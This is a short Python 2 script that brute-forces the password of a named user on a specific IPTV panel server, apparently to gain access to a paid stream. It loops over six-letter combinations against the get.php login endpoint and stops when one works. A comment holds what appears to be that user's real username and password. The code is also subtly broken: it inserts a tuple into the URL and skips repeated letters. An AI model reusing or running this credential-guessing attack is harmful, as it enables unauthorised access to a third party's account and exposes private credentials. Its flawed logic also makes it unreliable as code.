import urllib2

base_url = 'http://tvdasogra.com:8880'
# '{0}, {1}, {2}'.format('a', 'b', 'c')
user_name = "rebolinho"
password = ""


# m3u_url = '{0}/get.php?username={1}&password={2}'.format(base_url, user_name, password)
# 'rebolinho/jezito'

def get_response(url):
    req = urllib2.Request(url)
    req.add_header('User-Agent',
                   'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3')
    try:
        response = urllib2.urlopen(req, timeout=1)
        responsestr = response.read()
        response.close()
        return responsestr
    except:
        return ""


# from itertools import permutations
from itertools import combinations
from string import ascii_lowercase

for x in combinations(ascii_lowercase, r=6):
    m3u_url = '{0}/get.php?username={1}&password={2}'.format(base_url, user_name, x)
    link = get_response(m3u_url)
    if len(link) > 0:
        print "password->" + str(x)
        break
